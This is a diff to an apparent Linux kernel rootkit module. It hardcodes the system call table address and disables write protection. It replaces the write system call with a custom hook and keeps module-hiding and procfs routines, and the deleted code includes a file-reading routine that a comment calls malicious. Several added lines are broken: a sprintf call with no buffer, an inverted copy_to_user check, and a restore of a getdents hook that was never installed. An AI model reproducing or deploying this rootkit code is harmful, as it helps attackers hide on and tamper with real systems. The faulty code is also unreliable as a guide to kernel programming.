@@ -12,7 +12,7 @@ static char desc[50];
 
 // unsigned long *syscall_table = NULL;
 unsigned long* syscall_table = (unsigned long*)0xffffffff816001e0;
-// found with grep syscall_table /boot/System.map-4.* | head -n 1 | awk '{print $1}'
+// found with grep sys_call_table /boot/System.map-4.* | head -n 1 | awk '{print $1}'
 //typedef asmlinkage long (*original_stuff) (const char *, int, mode_t);
 //original_stuff original_write;
 asmlinkage long (*original_write)(unsigned int,
@@ -24,62 +24,13 @@ asmlinkage long (*original_getdents)(unsigned int,
 
 asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
 {
-    printk("test");
+    sprintf("test");
     return original_write(i,u,s);
 }
 
-char *acquire_kernel_version (char *buf) {
-    struct file *proc_version;
-    char *kernel_version;
-
-    /*
-     * We use this to store the userspace perspective of the filesystem
-     * so we can switch back to it after we are done reading the file
-     * into kernel memory
-     */
-    mm_segment_t oldfs;
-
-    /*
-     * Standard trick for reading a file into kernel space
-     * This is very bad practice. We're only doing it here because
-     * we're malicious and don't give a damn about best practices.
-     */
-    oldfs = get_fs();
-    set_fs (KERNEL_DS);
-
-    /*
-     * Open the version file in the /proc virtual filesystem
-     */
-    proc_version = filp_open(PROC_V, O_RDONLY, 0);
-    if (IS_ERR(proc_version) || (proc_version == NULL)) {
-        return NULL;
-    }
-
-    /*
-     * Zero out memory just to be safe
-     */
-    memset(buf, 0, MAX_VERSION_LEN);
-
-    /*
-     * Read version info from /proc virtual filesystem
-     */
-    vfs_read(proc_version, buf, MAX_VERSION_LEN, &(proc_version->f_pos));
-
-    /*
-     * Extract the third field from the full version string
-     */
-    kernel_version = strsep(&buf, " ");
-    kernel_version = strsep(&buf, " ");
-    kernel_version = strsep(&buf, " ");
-
-    filp_close(proc_version, 0);
-
-    /*
-     * Switch filesystem context back to user space mode
-     */
-    set_fs(oldfs);
-
-    return kernel_version;
+asmlinkage long custom_getdents(unsigned int i, struct linux_dirent __user *u, unsigned int i2)
+{
+    return original_getdents(i, u, i2);
 }
 
 void module_hide(void)
@@ -118,7 +69,8 @@ static ssize_t rtkit_read(struct file *file, char __user *buffer,
 				count = temp;
 		temp -= count;
 
-		copy_to_user(buffer, desc, count);
+		if(!copy_to_user(buffer, desc, count))
+      return -1;
 
 		if(count == 0) {
 				sprintf(desc, "test\n");
@@ -176,9 +128,10 @@ static int __init rootkit_init(void)
 				procfs_clean();
 				return 1;
 		}
-    original_getdents = sys_getdents;
-    original_write = sys_write;
-    // sys_write = custom_write;
+    original_getdents = (void*)syscall_table[__NR_getdents];
+    original_write = (void*)syscall_table[__NR_write];
+    GPF_DISABLE();
+    syscall_table[__NR_write] = (long)custom_write;
 		printk(KERN_INFO "Loading rootkit\n");
 		return 0;
 }
@@ -189,6 +142,9 @@ static void __exit rootkit_exit(void)
 		module_show();
 		procfs_clean();
 		module_hide();
+    syscall_table[__NR_write] = (long)original_write;
+    syscall_table[__NR_getdents] = (long)original_getdents;
+    GPF_ENABLE();
 		printk(KERN_INFO "Closing rootkit\n");
 }
 
